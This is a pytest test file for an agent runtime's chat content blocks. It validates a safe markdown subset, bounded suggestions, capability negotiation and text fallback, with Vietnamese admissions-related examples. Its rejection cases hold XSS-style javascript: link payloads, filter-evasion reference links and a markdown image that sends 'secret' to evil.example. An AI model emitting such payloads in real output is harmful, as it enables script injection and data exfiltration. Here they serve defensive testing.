"""Content blocks: safe markdown subset, bounded suggestions, capability manifest."""
import pytest
from pydantic import TypeAdapter, ValidationError

from agent_runtime.sessions.schemas.activity import (
    CapabilitySnapshot,
    MarkdownBlock,
    SuggestionsBlock,
    SupportedBlock,
    TypedBlock,
)
from agent_runtime.sessions.services.blocks import DEGRADABLE_TYPES, markdown_to_text, project_blocks

_BLOCK = TypeAdapter(TypedBlock)


def markdown(content):
    return {"block_id": "b1", "type": "markdown", "schema_version": 1, "content": content}


def suggestions(*labels):
    return {"block_id": "b2", "type": "suggestions", "schema_version": 1,
            "items": [{"label": label, "message_text": label} for label in labels]}


def test_markdown_and_suggestions_join_the_typed_block_union():
    assert isinstance(_BLOCK.validate_python(markdown("**Chào** em, xem [IHRD](https://ihrd.vn)")), MarkdownBlock)
    assert isinstance(_BLOCK.validate_python(suggestions("Làm bài khám phá")), SuggestionsBlock)


@pytest.mark.parametrize("content", [
    "<b>x</b>",
    "xem [link](javascript:alert(1))",
    "xem [link]( javascript:alert(1))",
    "xem [x][1]\n\n[1]: javascript:alert(1)",
    "x" * 4001,
    " ",
    "![x](https://evil.example/p?d=secret)",
    "> [1]: javascript:alert(1)",
    "- [1]: javascript:alert(1)",
    "[x][r]\n\n1) [r]: javascript:alert(1)",
    "[x][a\\]b]\n\n[a\\]b]: javascript:alert(1)",
])
def test_markdown_rejects_html_unsafe_links_and_oversize(content):
    with pytest.raises(ValidationError):
        _BLOCK.validate_python(markdown(content))


def test_markdown_accepts_http_inline_and_reference_links():
    assert isinstance(_BLOCK.validate_python(markdown("xem [IHRD](https://ihrd.vn)")), MarkdownBlock)
    assert isinstance(_BLOCK.validate_python(markdown("xem [x][1]\n\n[1]: https://ihrd.vn")), MarkdownBlock)


@pytest.mark.parametrize("labels", [(), ("a", "b", "c", "d", "e"), ("x" * 61,), ("a", "a")])
def test_suggestions_are_bounded(labels):
    with pytest.raises(ValidationError):
        _BLOCK.validate_python(suggestions(*labels))


def test_clients_may_advertise_new_blocks_but_defaults_do_not():
    snapshot = CapabilitySnapshot(supported_blocks=[
        {"type": "text", "schema_versions": [1]}, {"type": "markdown", "schema_versions": [1]},
        {"type": "suggestions", "schema_versions": [1]}])
    assert {block.type for block in snapshot.supported_blocks} == {"text", "markdown", "suggestions"}
    assert {block.type for block in CapabilitySnapshot().supported_blocks}.isdisjoint({"markdown", "suggestions"})
    with pytest.raises(ValidationError):
        CapabilitySnapshot(supported_blocks=[{"type": "markdown", "schema_versions": [2]}])


FULL = CapabilitySnapshot(supported_blocks=[
    {"type": "text", "schema_versions": [1]}, {"type": "markdown", "schema_versions": [1]},
    {"type": "suggestions", "schema_versions": [1]}])


def test_supported_blocks_pass_through_unchanged():
    blocks = (_BLOCK.validate_python(markdown("**A**")), _BLOCK.validate_python(suggestions("Hi")))
    assert project_blocks(blocks, FULL) == blocks


def test_projection_is_per_block_type():
    markdown_only = CapabilitySnapshot(supported_blocks=[
        {"type": "text", "schema_versions": [1]}, {"type": "markdown", "schema_versions": [1]}])
    md, sg = project_blocks((_BLOCK.validate_python(markdown("**A**")), _BLOCK.validate_python(suggestions("Hi"))),
                            markdown_only)
    assert (md.type, sg.type) == ("markdown", "text")


def test_legacy_clients_receive_text_with_stable_ids():
    md = _BLOCK.validate_python(markdown("**Chào** em\n- một\n- [IHRD](https://ihrd.vn)"))
    sg = _BLOCK.validate_python(suggestions("Làm bài khám phá", "Ngành CNTT học gì?"))
    text_md, text_sg = project_blocks((md, sg), CapabilitySnapshot())
    assert (text_md.type, text_md.block_id) == ("text", "b1")
    assert text_md.content == "Chào em\n• một\n• IHRD (https://ihrd.vn)"
    assert (text_sg.type, text_sg.block_id) == ("text", "b2")
    assert text_sg.content == "Gợi ý: Làm bài khám phá · Ngành CNTT học gì?"


def test_markdown_to_text_strips_emphasis():
    assert markdown_to_text("*nghiêng* và __đậm__") == "nghiêng và đậm"


def test_markdown_accepts_prose_less_than():
    assert isinstance(_BLOCK.validate_python(markdown("nếu A < B thì")), MarkdownBlock)


def test_markdown_to_text_keeps_urls_and_snake_case_intact():
    assert markdown_to_text("xem [trang](https://ihrd.vn/nganh_cong_nghe_thong_tin)") == \
        "xem trang (https://ihrd.vn/nganh_cong_nghe_thong_tin)"
    assert markdown_to_text("user_name_id và _nghiêng_") == "user_name_id và nghiêng"
    assert markdown_to_text("[**a**](https://x.vn/a_b_c)") == "a (https://x.vn/a_b_c)"


def test_markdown_to_text_degrades_link_with_leading_space():
    assert markdown_to_text("[a]( https://x)") == "a (https://x)"


def test_degradable_types_are_the_content_blocks():
    assert DEGRADABLE_TYPES == {"markdown", "suggestions", "knowledge_card"}


CARD = {"block_id": "c1", "type": "knowledge_card", "schema_version": 1, "title": "Trường A",
        "fields": [{"label": "Học phí", "value": "25.000.000"}, {"label": "Tỉnh", "value": "Hà Nội"}],
        "source_url": "https://ihrd.vn/a", "document_id": "doc_a", "revision": 2,
        "updated_at": "2026-10-27T03:00:00Z"}
TEXT_AND_MARKDOWN = CapabilitySnapshot(supported_blocks=[SupportedBlock(type="text", schema_versions=(1,)),
                                                         SupportedBlock(type="markdown", schema_versions=(1,))])


def test_knowledge_card_degrades_to_markdown_then_text():
    card = _BLOCK.validate_python(CARD)
    (md,) = project_blocks((card,), TEXT_AND_MARKDOWN)
    assert md.type == "markdown" and md.block_id == "c1"
    assert md.content == "**Trường A**\n- Học phí: 25.000.000\n- Tỉnh: Hà Nội\n[Nguồn](https://ihrd.vn/a)"
    (text,) = project_blocks((card,), CapabilitySnapshot())
    assert text.content == "Trường A\n• Học phí: 25.000.000\n• Tỉnh: Hà Nội\nNguồn (https://ihrd.vn/a)"
    full = CapabilitySnapshot(supported_blocks=[SupportedBlock(type="text", schema_versions=(1,)),
                                                SupportedBlock(type="knowledge_card", schema_versions=(1,))])
    assert project_blocks((card,), full) == (card,)


def test_knowledge_card_with_markup_degrades_straight_to_text():
    card = _BLOCK.validate_python({**CARD, "fields": [{"label": "Ghi chú", "value": "<b>xét học bạ</b>"}],
                                   "source_url": None})
    (block,) = project_blocks((card,), TEXT_AND_MARKDOWN)
    assert (block.type, block.content) == ("text", "Trường A\n• Ghi chú: <b>xét học bạ</b>")


@pytest.mark.parametrize("change", [{"fields": []}, {"source_url": "http://ihrd.vn/a"},
                                    {"fields": [{"label": "x", "value": " "}]}, {"revision": 0}])
def test_knowledge_card_rejects_bad_shapes(change):
    with pytest.raises(ValidationError):
        _BLOCK.validate_python({**CARD, **change})


def test_knowledge_card_values_cannot_become_live_links_or_emphasis():
    card = _BLOCK.validate_python({**CARD, "title": "A_*B*", "source_url": None,
                                   "fields": [{"label": "Đăng ký", "value": "[x](http://evil.example)"}]})
    (md,) = project_blocks((card,), TEXT_AND_MARKDOWN)
    assert md.type == "markdown"
    assert "[x](" not in md.content and "\\[x\\]\\(http://evil.example\\)" in md.content
    assert "A\\_\\*B\\*" in md.content
    (text,) = project_blocks((card,), CapabilitySnapshot())
    assert text.content == "A_*B*\n• Đăng ký: [x](http://evil.example)"


def test_markdown_to_text_unescapes_backslash_escapes():
    assert markdown_to_text(r"\*not bold\* a\\b \`c\`") == "*not bold* a\\b `c`"
